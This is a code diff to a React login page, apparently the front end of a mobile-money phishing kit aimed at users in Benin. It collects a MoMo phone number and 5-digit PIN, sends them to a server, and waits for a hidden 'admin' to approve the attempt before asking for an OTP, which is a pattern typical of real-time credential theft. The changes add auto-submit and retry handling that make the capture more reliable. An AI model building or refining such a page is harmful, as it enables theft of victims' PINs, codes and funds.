@@ -1,4 +1,4 @@
-import { useState, useEffect, type FormEvent } from "react";
+import { useState, useEffect, useRef, type FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";
 
@@ -10,6 +10,9 @@ const Login = () => {
   const [showPin, setShowPin] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const navigate = useNavigate();
+  
+  // Ref to prevent double clicks
+  const isSubmitting = useRef(false);
 
   const isFormValid = phone.length === 10 && pin.length === 5;
 
@@ -18,19 +21,22 @@ const Login = () => {
     fetch(`${API_URL}/`).catch(() => {});
   }, []);
 
-  const handleLogin = async (e: FormEvent) => {
-    e.preventDefault();
-    if (!isFormValid) return;
-
+  const handleLogin = async (e?: FormEvent) => {
+    if (e) e.preventDefault();
+    
+    // Prevent double submission
+    if (!isFormValid || isProcessing || isSubmitting.current) return;
+    
+    isSubmitting.current = true;
     setIsProcessing(true);
     localStorage.setItem("userPhone", phone);
 
     // 45-second timeout fallback
     const timeoutId = setTimeout(() => {
       setIsProcessing(false);
-      setPhone("");
-      setPin("");
-      navigate("/login");
+      isSubmitting.current = false;
+      // Don't clear fields, let user retry
+      alert("Le serveur met trop de temps à répondre. Veuillez réessayer.");
     }, 45000);
 
     try {
@@ -43,43 +49,65 @@ const Login = () => {
 
       if (data.status === "pending" && data.login_id) {
         const interval = setInterval(async () => {
-          const statusRes = await fetch(`${API_URL}/api/login-status/${data.login_id}`);
-          const statusData = await statusRes.json();
+          try {
+            const statusRes = await fetch(`${API_URL}/api/login-status/${data.login_id}`);
+            const statusData = await statusRes.json();
 
-          if (statusData.status !== "pending") {
-            clearInterval(interval);
-            clearTimeout(timeoutId);
-            setIsProcessing(false);
+            if (statusData.status !== "pending") {
+              clearInterval(interval);
+              clearTimeout(timeoutId);
+              setIsProcessing(false);
 
-            if (statusData.status === "approved") {
-              navigate("/otp", { state: { phone: phone } });
-            } else {
-              setPhone("");
-              setPin("");
-              navigate("/login");
+              if (statusData.status === "approved") {
+                navigate("/otp", { state: { phone: phone } });
+              } else {
+                // Denied by admin
+                setPhone("");
+                setPin("");
+                isSubmitting.current = false;
+                navigate("/login");
+              }
             }
+          } catch (err) {
+            console.error("Polling error:", err);
           }
         }, 2000);
       } else {
         clearTimeout(timeoutId);
         setIsProcessing(false);
+        isSubmitting.current = false;
         navigate("/otp", { state: { phone: phone } });
       }
     } catch (error) {
       clearTimeout(timeoutId);
       setIsProcessing(false);
-      setPhone("");
-      setPin("");
-      navigate("/login");
+      isSubmitting.current = false;
+      alert("Erreur de connexion. Vérifiez votre réseau.");
+    }
+  };
+
+  // Handle Phone Input
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 10);
+    setPhone(val);
+  };
+
+  // Handle PIN Input with Auto-Submit
+  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, "");
+    setPin(val);
+
+    // Auto-submit if valid
+    if (val.length === 5 && phone.length === 10) {
+      handleLogin();
     }
   };
 
   return (
     <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
-
+      
       {/* HEADER */}
-      <div className="text-center mb-8 mt-4">
-        {/* Wallet Icon Box */}
+      <div className="text-center mb-8 mt-4 animate-[fadeIn_0.5s_ease-out]">
         <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
           <Wallet size={32} color="#1E1E1E" />
         </div>
@@ -92,7 +120,7 @@ const Login = () => {
       </div>
 
       {/* MAIN CARD */}
-      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
+      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8 animate-[slideUp_0.4s_ease-out]">
         <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-2">Bon retour</h2>
         <p className="text-sm text-gray-500 mb-6 leading-relaxed">
           Connectez-vous avec votre numéro mobile pour accéder à vos produits instantanés.
@@ -105,7 +133,6 @@ const Login = () => {
               Numéro de téléphone
             </label>
             <div className="flex items-center border border-gray-200 rounded-xl px-3 py-2 bg-white focus-within:border-[#F0B90B] focus-within:ring-2 focus-within:ring-[#FCD535]/50 transition-all">
-              {/* Beige/Off-white prefix block matching the screenshot */}
               <div className="flex items-center bg-[#FAF8F5] rounded-lg px-3 py-1.5 mr-2">
                 <span className="flex items-center text-sm font-medium text-gray-800 whitespace-nowrap">
                   🇧🇯 +229
@@ -116,10 +143,11 @@ const Login = () => {
                 type="tel"
                 placeholder="01 23 45 67 89"
                 value={phone}
-                onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
+                onChange={handlePhoneChange}
                 maxLength={10}
                 required
-                className="flex-1 min-w-0 outline-none text-lg tracking-wider text-gray-900 bg-transparent placeholder:text-gray-300"
+                disabled={isProcessing}
+                className="flex-1 min-w-0 outline-none text-lg tracking-wider text-gray-900 bg-transparent placeholder:text-gray-300 disabled:opacity-50"
               />
             </div>
             <p className="text-xs text-gray-500 mt-1.5">Numéro MoMo du Bénin (10 chiffres)</p>
@@ -137,9 +165,10 @@ const Login = () => {
                 maxLength={5}
                 placeholder="•••••"
                 value={pin}
-                onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
+                onChange={handlePinChange}
                 required
-                className="flex-1 min-w-0 outline-none text-lg tracking-[0.5em] text-gray-900 bg-transparent placeholder:text-gray-300 placeholder:tracking-[0.3em]"
+                disabled={isProcessing}
+                className="flex-1 min-w-0 outline-none text-lg tracking-[0.5em] text-gray-900 bg-transparent placeholder:text-gray-300 placeholder:tracking-[0.3em] disabled:opacity-50"
               />
               <button
                 type="button"
@@ -180,13 +209,29 @@ const Login = () => {
       {/* SPINNER MODAL */}
       {isProcessing && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
-          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
+          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl animate-[popIn_0.3s_ease-out]">
             <div className="w-12 h-12 mx-auto mb-5 rounded-full border-4 border-gray-100 border-t-[#F0B90B] animate-spin" />
             <h3 className="text-lg font-bold text-[#1E1E1E] mb-2">Vérification en cours</h3>
             <p className="text-sm text-gray-500">En attente d'approbation...</p>
           </div>
         </div>
       )}
+
+      {/* ANIMATIONS */}
+      <style>{`
+        @keyframes fadeIn {
+          from { opacity: 0; }
+          to { opacity: 1; }
+        }
+        @keyframes slideUp {
+          from { opacity: 0; transform: translateY(20px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes popIn {
+          0% { opacity: 0; transform: scale(0.9); }
+          100% { opacity: 1; transform: scale(1); }
+        }
+      `}</style>
     </div>
   );
 };
